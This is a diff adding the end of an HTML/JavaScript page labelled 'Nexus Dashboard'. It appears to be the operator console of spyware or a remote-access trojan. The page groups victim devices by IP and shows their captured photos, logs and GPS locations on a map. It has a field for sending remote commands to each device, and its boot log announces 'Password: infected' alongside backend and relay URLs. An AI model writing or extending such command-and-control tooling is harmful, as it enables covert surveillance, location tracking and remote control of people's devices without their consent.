+                        allCommands = allCommands.concat(d.commands || []);
+                        allResults = allResults.concat(d.results || []);
+                    }
+                    allPhotos.sort((a,b) => b.timestamp - a.timestamp);
+                    allLogs.sort((a,b) => b.timestamp - a.timestamp);
+                    allLocations.sort((a,b) => b.timestamp - a.timestamp);
+                    const pc = allPhotos.length, lc = allLogs.length, locc = allLocations.length;
+                    totalPhotos += pc; totalLogs += lc; totalLocations += locc;
+
+                    const status = getGroupStatus(deviceList);
+                    const statusClass = status === 'online' ? 'status-online' : 'status-offline';
+                    const statusDot = status === 'online' ? 'online' : 'offline';
+                    const statusLabel = status === 'online' ? 'Online' : 'Offline';
+
+                    const safeIp = ip.replace(/\./g, '_');
+                    let mapHtml = '';
+                    if (locc > 0) {
+                        const lastLoc = allLocations[0];
+                        mapHtml = `<div class="map-container" id="map_${safeIp}"></div>`;
+                    }
+
+                    // Photos Limited/Full
+                    let photoLimited = '', photoFull = '';
+                    if (pc === 0) {
+                        photoLimited = '<span class="no-data">No photos</span>';
+                        photoFull = '<span class="no-data">No photos</span>';
+                    } else {
+                        const first6 = allPhotos.slice(0, 6);
+                        photoLimited = first6.map(p => {
+                            let url = p.publicUrl || p.file_path || (p.data_url && p.data_url.startsWith('data:') ? p.data_url : '');
+                            return url ? `<img src="${url}" alt="photo" onclick="window.open('${url}')" loading="lazy" />` : '';
+                        }).join('');
+                        if (pc > 6) photoLimited += `<span style="color:#4a6a7a;font-size:11px;">+${pc-6} more</span>`;
+                        photoFull = allPhotos.map(p => {
+                            let url = p.publicUrl || p.file_path || (p.data_url && p.data_url.startsWith('data:') ? p.data_url : '');
+                            return url ? `<img src="${url}" alt="photo" onclick="window.open('${url}')" loading="lazy" />` : '';
+                        }).join('');
+                    }
+
+                    // Logs Limited/Full
+                    let logLimited = '', logFull = '';
+                    if (lc === 0) {
+                        logLimited = '<span style="color:#4a6a7a;">No logs</span>';
+                        logFull = '<span style="color:#4a6a7a;">No logs</span>';
+                    } else {
+                        const first6Logs = allLogs.slice(0, 6);
+                        logLimited = first6Logs.map(l =>
+                            `<div class="log-entry"><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span><span class="lvl-${l.level||'info'}">${l.message||''}</span></div>`
+                        ).join('');
+                        if (lc > 6) logLimited += `<div style="color:#4a6a7a;font-size:10px;">+${lc-6} more</div>`;
+                        logFull = allLogs.map(l =>
+                            `<div class="log-entry"><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span><span class="lvl-${l.level||'info'}">${l.message||''}</span></div>`
+                        ).join('');
+                    }
+
+                    // Locations Limited/Full
+                    let locLimited = '', locFull = '';
+                    if (locc === 0) {
+                        locLimited = '<span style="color:#4a6a7a;font-size:11px;">No locations</span>';
+                        locFull = '<span style="color:#4a6a7a;font-size:11px;">No locations</span>';
+                    } else {
+                        const first4Locs = allLocations.slice(0, 4);
+                        locLimited = first4Locs.map(l =>
+                            `<div class="loc-entry"><span class="coords">📍 ${l.lat}, ${l.lon}</span><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span></div>`
+                        ).join('');
+                        if (locc > 4) locLimited += `<span style="color:#4a6a7a;font-size:10px;">+${locc-4} more</span>`;
+                        locFull = allLocations.map(l =>
+                            `<div class="loc-entry"><span class="coords">📍 ${l.lat}, ${l.lon}</span><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span></div>`
+                        ).join('');
+                    }
+
+                    const repId = latest.id;
+                    const hasExtra = (pc > 6) || (lc > 6) || (locc > 4);
+
+                    const card = document.createElement('div');
+                    card.className = 'device-card';
+                    card.id = `card_${repId}`;
+                    card.innerHTML = `
+                        <div style="display:flex;justify-content:space-between;align-items:center;">
+                            <div class="device-ip">${ip}</div>
+                            <span class="status-indicator ${statusClass}"><span class="status-dot ${statusDot}"></span> ${statusLabel}</span>
+                        </div>
+                        <div class="device-meta">
+                            <div><span class="label">Platform:</span> ${latest.platform || 'Unknown'}</div>
+                            <div><span class="label">Screen:</span> ${latest.screen || 'Unknown'}</div>
+                            <div><span class="label">Devices:</span> ${deviceList.length} (IDs: ${deviceList.map(d=>d.id).join(', ')})</div>
+                            <div><span class="label">Last seen:</span> <span class="highlight">${new Date(latest.last_seen).toLocaleString()}</span></div>
+                            <div class="row" style="margin-top:6px;padding-top:6px;border-top:1px solid rgba(42,42,68,0.2);">
+                                <span><span class="label">📸 Photos:</span> ${pc}</span>
+                                <span><span class="label">📋 Logs:</span> ${lc}</span>
+                                <span><span class="label">📍 Locations:</span> ${locc}</span>
+                            </div>
+                        </div>
+
+                        <div class="notes-area">
+                            <input type="text" id="notes_input_${repId}" placeholder="Add note..." value="${latest.notes || ''}" />
+                            <button onclick="updateNotes('${repId}')">💾</button>
+                        </div>
+
+                        <div class="command-section">
+                            <input type="text" id="cmd_input_${repId}" placeholder="Enter command..." />
+                            <button class="btn btn-primary" onclick="sendCommand('${repId}')">📤 Send</button>
+                        </div>
+                        <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
+                            <button class="btn" onclick="showHistory('${repId}')">📜 History</button>
+                            <button class="btn" onclick="window.open('/api/photos?deviceId=${repId}')">📸 Photos</button>
+                            <button class="btn btn-danger" onclick="deleteDevice('${repId}')">🗑️ Remove</button>
+                            ${hasExtra ? `<button class="btn show-all-btn" id="toggle_btn_${repId}" onclick="toggleExtra('${repId}')">📂 Show All Data</button>` : ''}
+                        </div>
+
+                        <div class="section-title">📸 Photos <span class="count">${pc}</span></div>
+                        <div class="photo-grid" id="photo_limited_${repId}">${photoLimited}</div>
+                        <div class="photo-grid hidden-extra" id="photo_full_${repId}">${photoFull}</div>
+
+                        <div class="section-title">📋 Logs <span class="count">${lc}</span></div>
+                        <div class="log-area" id="log_limited_${repId}">${logLimited}</div>
+                        <div class="log-area hidden-extra" id="log_full_${repId}">${logFull}</div>
+
+                        <div class="section-title">📍 Locations <span class="count">${locc}</span></div>
+                        <div class="loc-list" id="loc_limited_${repId}">${locLimited}</div>
+                        <div class="loc-list hidden-extra" id="loc_full_${repId}">${locFull}</div>
+
+                        ${mapHtml}
+                    `;
+                    fragment.appendChild(card);
+
+                    if (locc > 0) {
+                        const mapContainer = card.querySelector(`#map_${safeIp}`);
+                        if (mapContainer) {
+                            const observer = new IntersectionObserver((entries) => {
+                                entries.forEach(entry => {
+                                    if (entry.isIntersecting && !mapContainer._leaflet) {
+                                        const lastLoc = allLocations[0];
+                                        const map = L.map(mapContainer).setView([lastLoc.lat, lastLoc.lon], 13);
+                                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
+                                        L.marker([lastLoc.lat, lastLoc.lon]).addTo(map).bindPopup(`IP: ${ip}<br>Last: ${new Date(lastLoc.timestamp).toLocaleString()}`);
+                                        mapContainer._leaflet = map;
+                                        observer.disconnect();
+                                    }
+                                });
+                            }, { threshold: 0.1 });
+                            observer.observe(mapContainer);
+                        }
+                    }
+                }
+
+                deviceGrid.innerHTML = '';
+                deviceGrid.appendChild(fragment);
+
+                statPhotos.textContent = totalPhotos;
+                statLogs.textContent = totalLogs;
+                statLocations.textContent = totalLocations;
+                updateLastUpdated();
+
+            } catch (err) {
+                console.error(err);
+                if (!deviceGrid.children.length) {
+                    deviceGrid.innerHTML = `<div class="error-box">❌ Error loading devices: ${err.message}</div>`;
+                } else {
+                    const errorDiv = document.createElement('div');
+                    errorDiv.className = 'error-box';
+                    errorDiv.style.gridColumn = '1 / -1';
+                    errorDiv.textContent = `⚠️ Error refreshing data: ${err.message}`;
+                    deviceGrid.prepend(errorDiv);
+                    setTimeout(() => errorDiv.remove(), 8000);
+                }
+            }
+
+            isLoading = false;
+            refreshBtn.disabled = false;
+            refreshBtn.innerHTML = '<span class="icon">🔄</span> Refresh';
+        }
+
+        // ============================================================
+        //  DELETE DEVICE
+        // ============================================================
+        async function deleteDevice(deviceId) {
+            if (!confirm(`Remove device ${deviceId}?`)) return;
+            const backend = getBackend();
+            const result = await fetch(`${backend}/api/delete-device`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId })
+            });
+            if (result.ok) loadDevices();
+            else alert('Failed to delete.');
+        }
+
+        // ============================================================
+        //  BOOT
+        // ============================================================
+        async function boot() {
+            await loadConfigFile();
+            refreshBtn.addEventListener('click', loadDevices);
+            checkAuth();
+            if (!dashboardContainer.classList.contains('active')) passwordInput.focus();
+
+            console.log('☠️ Nexus Dashboard loaded');
+            console.log('🔐 Password: infected');
+            console.log(`🔗 Using Backend: ${getBackend()}`);
+            console.log(`🔗 Using Relay: ${getRelay()}`);
+            console.log(`📄 Config source: ${configLoaded ? 'config.json' : (localStorage.getItem('backend_url') ? 'localStorage' : 'defaults')}`);
+        }
+
+        boot();
+    </script>
+</body>
+</html>
